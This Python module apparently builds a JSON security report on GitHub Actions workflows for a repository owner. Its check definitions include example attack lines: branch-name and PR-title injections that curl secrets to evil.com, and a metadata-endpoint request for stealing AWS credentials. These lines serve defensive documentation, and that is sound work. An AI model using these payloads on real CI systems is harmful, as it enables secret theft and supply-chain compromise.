from agent_factory.remote_mcp_client import RemoteMCPClient
from services.llm_service import call_llm
import httpx
import re

async def run(input_dict, tools):
    mcpc = { url : RemoteMCPClient(remote_url = url) for url in tools.keys() }
    http_client = httpx.AsyncClient()
    try:
        owner = input_dict.get("owner", "apache")
        repos_str = input_dict.get("repos", "").strip()
        repo_filter = set(r.strip() for r in repos_str.split(",") if r.strip()) if repos_str else None
        print(f"JSON export starting for owner={owner}" +
              (f" (filtered to {len(repo_filter)} repos)" if repo_filter else ""), flush=True)

        report_ns = data_store.use_namespace(f"ci-report:{owner}")
        security_ns = data_store.use_namespace(f"ci-security:{owner}")
        classification_ns = data_store.use_namespace(f"ci-classification:{owner}")

        pub_stats = report_ns.get("latest_stats")
        sec_stats = security_ns.get("latest_stats")

        if not pub_stats or not sec_stats:
            return {"outputText": "Error: Run Publishing and Security agents first."}

        # --- Collect all repos ---
        publishing_repos = set(pub_stats.get("publishing_repos", []))
        if repo_filter:
            publishing_repos = publishing_repos & repo_filter

        # --- Read per-repo classifications from Publishing cache ---
        all_cls_keys = classification_ns.list_keys()
        meta_keys = [k for k in all_cls_keys if k.startswith("__meta__:")]
        if repo_filter:
            meta_keys = [k for k in meta_keys if k.replace("__meta__:", "") in repo_filter]

        repo_workflows = {}  # repo -> [workflow classifications]
        for mk in meta_keys:
            repo = mk.replace("__meta__:", "")
            meta = classification_ns.get(mk)
            if not meta or not meta.get("complete"):
                continue
            wf_names = meta.get("workflows", [])
            if not wf_names:
                repo_workflows[repo] = []
                continue
            wfs = []
            for wf_name in wf_names:
                cls = classification_ns.get(f"{repo}:{wf_name}")
                if cls:
                    wfs.append(cls)
            repo_workflows[repo] = wfs

        print(f"Read classifications for {len(repo_workflows)} repos", flush=True)

        # --- Read per-repo security findings from Security cache ---
        all_sec_keys = security_ns.list_keys()
        finding_keys = [k for k in all_sec_keys if k.startswith("findings:")]
        if repo_filter:
            finding_keys = [k for k in finding_keys if k.replace("findings:", "") in repo_filter]

        repo_findings = {}
        for k in finding_keys:
            repo = k.replace("findings:", "")
            findings = security_ns.get(k)
            if findings and isinstance(findings, list):
                repo_findings[repo] = findings

        print(f"Read findings for {len(repo_findings)} repos", flush=True)

        # --- Build per-repo JSON ---
        all_repos = sorted(set(repo_workflows.keys()) | set(repo_findings.keys()))

        CATEGORY_ORDER = ["release_artifact", "snapshot_artifact", "ci_infrastructure", "documentation", "none"]
        SEV_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]

        def safe_str(val):
            if val is None:
                return ""
            if isinstance(val, dict):
                return json.dumps(val)
            if isinstance(val, list):
                return ", ".join(str(v) for v in val)
            return str(val).strip()

        def classify_workflow(w):
            """Extract clean workflow record from classification cache."""
            cat = safe_str(w.get("category")).lower().strip()
            if cat not in CATEGORY_ORDER:
                cat = "none"

            ecosystems = []
            for e in (w.get("ecosystems") or []):
                e_str = safe_str(e).lower().strip().replace(" ", "_")
                if e_str and e_str != "github_actions_artifacts":
                    ecosystems.append(e_str)

            # Normalize security notes to strings
            notes = []
            for n in (w.get("security_notes") or []):
                if isinstance(n, str):
                    notes.append(n.strip())
                elif isinstance(n, dict):
                    risk = n.get("risk_level") or n.get("risk") or "INFO"
                    desc = n.get("description") or n.get("details") or str(n)
                    notes.append(f"[{risk}] {desc}")

            return {
                "file": w.get("file", "unknown"),
                "workflow_name": safe_str(w.get("workflow_name")) or w.get("file", "unknown"),
                "publishes": bool(w.get("publishes_to_registry")),
                "category": cat,
                "ecosystems": ecosystems,
                "trigger": safe_str(w.get("trigger")),
                "auth_method": safe_str(w.get("auth_method")),
                "publish_actions": w.get("publish_actions") or [],
                "publish_commands": w.get("publish_commands") or [],
                "summary": safe_str(w.get("summary")),
                "confidence": safe_str(w.get("confidence")),
                "security_notes": notes,
            }

        def classify_finding(f):
            """Extract clean finding record."""
            record = {
                "severity": f.get("severity", "INFO"),
                "check": f.get("check", "unknown"),
                "file": f.get("file", "unknown"),
                "detail": f.get("detail", ""),
            }
            if f.get("line"):
                record["line"] = f["line"]
            if f.get("lines"):
                record["lines"] = f["lines"]
            return record

        def summarize_severities(findings):
            counts = {}
            for f in findings:
                s = f.get("severity", "INFO")
                counts[s] = counts.get(s, 0) + 1
            return counts

        def summarize_checks(findings):
            counts = {}
            for f in findings:
                chk = f.get("check", "unknown")
                counts[chk] = counts.get(chk, 0) + 1
            return counts

        repos_json = []
        for repo in all_repos:
            wfs = repo_workflows.get(repo, [])
            findings = repo_findings.get(repo, [])
            publishes = repo in publishing_repos

            # Classify workflows
            workflow_records = [classify_workflow(w) for w in wfs]

            # Workflow category summary
            cat_counts = {}
            eco_set = set()
            for wr in workflow_records:
                if wr["publishes"]:
                    cat_counts[wr["category"]] = cat_counts.get(wr["category"], 0) + 1
                    eco_set.update(wr["ecosystems"])

            # Finding records
            finding_records = [classify_finding(f) for f in findings]
            sev_counts = summarize_severities(finding_records)
            check_counts = summarize_checks(finding_records)

            # Worst severity
            worst = "none"
            for s in SEV_ORDER:
                if sev_counts.get(s, 0) > 0:
                    worst = s
                    break

            # Trusted publishing: does this repo have TP opportunities?
            has_tp = False
            tp_ecosystems = []
            for wr in workflow_records:
                if not wr["publishes"] or wr["category"] not in ("release_artifact", "snapshot_artifact"):
                    continue
                auth_lower = wr["auth_method"].lower()
                if "oidc" in auth_lower or "trusted publisher" in auth_lower or "id-token" in auth_lower:
                    continue
                token_pats = ["token", "password", "secret", "api_key", "apikey", "nexus_user", "nexus_pw"]
                uses_token = any(p in auth_lower for p in token_pats)
                if uses_token:
                    tp_eligible = {"pypi", "npm", "nuget", "rubygems", "crates_io"}
                    for eco in wr["ecosystems"]:
                        if eco in tp_eligible:
                            has_tp = True
                            if eco not in tp_ecosystems:
                                tp_ecosystems.append(eco)

            repos_json.append({
                "repo": f"{owner}/{repo}",
                "has_workflows": len(wfs) > 0,
                "total_workflows": len(wfs),
                "publishes_to_registry": publishes,
                "ecosystems": sorted(eco_set),
                "category_counts": cat_counts,
                "trusted_publishing": {
                    "migration_needed": has_tp,
                    "eligible_ecosystems": sorted(tp_ecosystems),
                },
                "security": {
                    "total_findings": len(finding_records),
                    "worst_severity": worst,
                    "severity_counts": {s: sev_counts.get(s, 0) for s in SEV_ORDER if sev_counts.get(s, 0) > 0},
                    "check_counts": check_counts,
                },
                "workflows": workflow_records,
                "findings": finding_records,
            })

        # --- Check definitions with attack scenarios ---
        check_definitions = {
            "prt_checkout": {
                "label": "PR Target Code Execution",
                "severity": "CRITICAL",
                "description": "Workflow uses pull_request_target and explicitly checks out PR head code via ref: parameter.",
                "attack": "An external contributor opens a PR that modifies a script executed by the workflow. Because pull_request_target runs with the base repo's secrets and write permissions, the attacker's code executes with full access to repository secrets, signing keys, and can push malicious releases. Only flagged CRITICAL when the checkout ref: explicitly points to PR head. Default checkouts use the base branch and are safe.",
                "example": "1. Attacker forks the repo\n2. Modifies build.sh to exfiltrate $NPM_TOKEN to an external server\n3. Opens PR — workflow checks out attacker's branch via ref: github.event.pull_request.head.sha\n4. Secrets are leaked; attacker publishes backdoored package",
            },
            "composite_action_input_injection": {
                "label": "Composite Action Latent Injection",
                "severity": "MEDIUM",
                "description": "Composite action interpolates inputs.* directly in run: blocks. Not exploitable unless callers pass attacker-controlled values.",
                "attack": "The composite action interpolates inputs.* in shell run: blocks. Not exploitable as long as every calling workflow passes only trusted values (hardcoded strings, workflow_dispatch inputs from committers). If a future workflow passes attacker-controlled input (PR title, branch name, comment body), the interpolation becomes a shell injection vector. This is a latent risk that requires an unsafe caller to become exploitable.",
                "example": "1. Composite action has: run: echo \"Building ${{ inputs.version }}\"\n2. Today: called with version: \"1.2.3\" from workflow_dispatch (safe)\n3. Future PR adds: version: ${{ github.event.pull_request.title }} (unsafe)\n4. Attacker sets PR title to: \"; curl http://evil.com/steal?t=$NPM_TOKEN #",
            },
            "run_block_injection": {
                "label": "Workflow Script Injection",
                "severity": "LOW-MEDIUM",
                "description": "Direct ${{ }} interpolation of values in workflow run: blocks.",
                "attack": "When untrusted values (PR titles, branch names, issue bodies) are interpolated directly into shell scripts via ${{ }}, an attacker can inject arbitrary shell commands.",
                "example": "1. Workflow has: run: echo \"Branch: ${{ github.head_ref }}\"\n2. Attacker creates branch named: main\"; curl http://evil.com/steal?t=$SECRET #\n3. Shell interprets the branch name as a command\n4. Fix: pass through env: block and reference as $BRANCH",
            },
            "unpinned_actions": {
                "label": "Unpinned Action Tags",
                "severity": "MEDIUM",
                "description": "Third-party actions (outside actions/*, github/*, apache/*) referenced by mutable version tags instead of SHA-pinned commits. ASF policy exempts actions in those namespaces.",
                "attack": "An attacker compromises a third-party action's repository and pushes malicious code to an existing tag. Every workflow referencing that tag immediately runs the compromised code. This happened in the tj-actions/changed-files attack (March 2025).",
                "example": "1. Workflow uses cool-org/deploy-action@v2 (mutable tag, outside exempt namespaces)\n2. Attacker compromises the action repo and force-pushes to the v2 tag\n3. Next workflow run executes attacker's code with full repo access\n4. Fix: pin to SHA — cool-org/deploy-action@8843d7f92416211de9eb",
            },
            "composite_action_unpinned": {
                "label": "Unpinned Actions in Composite Actions",
                "severity": "MEDIUM",
                "description": "Composite actions reference third-party actions (outside actions/*, github/*, apache/*) by mutable tags.",
                "attack": "Same supply chain risk as unpinned workflow actions, but harder to audit. Reviewers checking .github/workflows/ won't see the unpinned refs buried inside .github/actions/*/action.yml.",
                "example": "1. Composite action uses cool-org/cache-action@v4\n2. 15 workflows call this composite action\n3. cool-org/cache-action@v4 tag is compromised\n4. All 15 workflows are now executing malicious code",
            },
            "composite_action_injection": {
                "label": "Composite Action Input Interpolation",
                "severity": "LOW",
                "description": "Composite action interpolates inputs in run: blocks (trusted callers today).",
                "attack": "Currently called only from trusted contexts, but if a future workflow passes untrusted input to this composite action, the interpolation becomes exploitable. The injection surface is pre-positioned.",
                "example": "1. Composite action has: run: ./build.sh --version=${{ inputs.version }}\n2. Today, only called from workflow_dispatch (committers only) — safe\n3. Future PR adds: version: ${{ github.event.pull_request.head.ref }}\n4. Now attacker-controlled input flows into shell execution",
            },
            "broad_permissions": {
                "label": "Overly Broad Token Permissions",
                "severity": "LOW",
                "description": "Workflow requests more GITHUB_TOKEN scopes than needed.",
                "attack": "A workflow with excessive scopes gives any compromised step the ability to push code, close issues, merge PRs, and modify releases. Least-privilege would limit blast radius.",
                "example": "1. Workflow has permissions: { contents: write, issues: write }\n2. A third-party action in the workflow is compromised\n3. Compromised action uses GITHUB_TOKEN to push a backdoor commit\n4. Fix: restrict to only needed scopes per job",
            },
            "cache_poisoning": {
                "label": "Cache Poisoning via PR",
                "severity": "INFO",
                "description": "Workflow uses actions/cache with pull_request trigger.",
                "attack": "An attacker's PR can populate the GitHub Actions cache with malicious build artifacts. If the cache key is predictable, subsequent runs on the main branch may restore the poisoned cache.",
                "example": "1. Workflow caches node_modules on PR events\n2. Attacker's PR modifies package-lock.json to add a malicious package\n3. Cache is populated with attacker's dependencies\n4. Next main-branch build restores the poisoned cache",
            },
            "missing_codeowners": {
                "label": "No CODEOWNERS File",
                "severity": "LOW",
                "description": "Repository has no CODEOWNERS file for workflow change review.",
                "attack": "Without CODEOWNERS requiring security team review of .github/ changes, any committer can modify workflow files, add new triggers, or introduce injection patterns without mandatory security review.",
                "example": "1. Committer adds pull_request_target trigger to an existing workflow\n2. No CODEOWNERS rule requires security review for .github/ changes\n3. PR is merged with standard code review\n4. Workflow is now vulnerable to external PRs",
            },
            "codeowners_gap": {
                "label": "CODEOWNERS Missing .github/ Coverage",
                "severity": "LOW",
                "description": "CODEOWNERS exists but has no rule covering .github/ directory.",
                "attack": "The repo has CODEOWNERS for source code but forgot to add .github/ coverage. Workflow modifications slip through without security review.",
                "example": "1. CODEOWNERS has: *.java @security-team but no .github/ rule\n2. Committer modifies .github/workflows/release.yml\n3. Change bypasses security team review\n4. Fix: add /.github/ @security-team to CODEOWNERS",
            },
            "third_party_actions": {
                "label": "Third-Party Actions",
                "severity": "INFO",
                "description": "Workflow uses actions from outside the actions/*, github/*, and apache/* namespaces.",
                "attack": "Third-party actions run with full access to the workflow's GITHUB_TOKEN and secrets. A compromised maintainer account or repo transfer can turn a trusted action into a supply chain attack vector.",
                "example": "1. Workflow uses cool-org/deploy-action@v2\n2. cool-org maintainer's GitHub account is compromised\n3. Attacker pushes malicious code to the v2 tag\n4. Every repo using this action now leaks secrets on next run",
            },
            "self_hosted_runner": {
                "label": "Self-Hosted Runner Exposure",
                "severity": "HIGH",
                "description": "Workflow runs on self-hosted runners with PR triggers. Severity depends on permissions and trigger type.",
                "attack": "Self-hosted runners persist state between jobs. An attacker's PR can execute arbitrary code on the runner, install backdoors, steal credentials cached on disk, or pivot to internal networks.",
                "example": "1. Workflow runs on self-hosted runner and triggers on pull_request\n2. Attacker's PR executes: curl http://169.254.169.254/latest/meta-data/\n3. AWS instance credentials are exfiltrated\n4. Attacker gains access to internal infrastructure",
            },
            "missing_dependency_updates": {
                "label": "No Dependency Update Configuration",
                "severity": "LOW",
                "description": "Repository has no dependabot.yml or renovate.json for automated dependency updates. ASF policy requires automated dependency management for all repos using GitHub Actions.",
                "attack": "Without automated dependency updates, vulnerable transitive dependencies may persist indefinitely. Actions pinned to SHA are not automatically updated when security fixes are released.",
                "example": "1. Repository uses actions/checkout@abc123 (pinned to SHA)\n2. A security vulnerability is found in that version\n3. No Dependabot or Renovate config to create update PRs\n4. Vulnerable action version persists until manually updated",
            },
        }

        # --- Build top-level summary ---
        output = {
            "schema_version": "1.0",
            "owner": owner,
            "generated_at": __import__("datetime").datetime.utcnow().isoformat() + "Z",
            "check_definitions": check_definitions,
            "summary": {
                "repos_scanned": pub_stats.get("repos_scanned", 0),
                "repos_with_workflows": pub_stats.get("repos_with_workflows", 0),
                "total_workflows": pub_stats.get("total_workflows", 0),
                "repos_publishing": len(publishing_repos),
                "ecosystem_counts": pub_stats.get("ecosystem_counts", {}),
                "category_counts": pub_stats.get("by_category", {}),
                "trusted_publishing_opportunities": pub_stats.get("trusted_publishing_opportunities", 0),
                "security": {
                    "total_findings": sec_stats.get("total_findings", 0),
                    "repos_with_findings": sec_stats.get("repos_with_findings", 0),
                    "severity_counts": sec_stats.get("severity_counts", {}),
                    "check_counts": sec_stats.get("check_counts", {}),
                },
            },
            "repos": repos_json,
        }

        output_json = json.dumps(output, indent=2, ensure_ascii=False)
        print(f"JSON report: {len(output_json)} chars, {len(repos_json)} repos", flush=True)

        # Store in data store
        combined_ns = data_store.use_namespace(f"ci-combined:{owner}")
        combined_ns.set("latest_json", output)

        return {"outputText": output_json}

    finally:
        await http_client.aclose()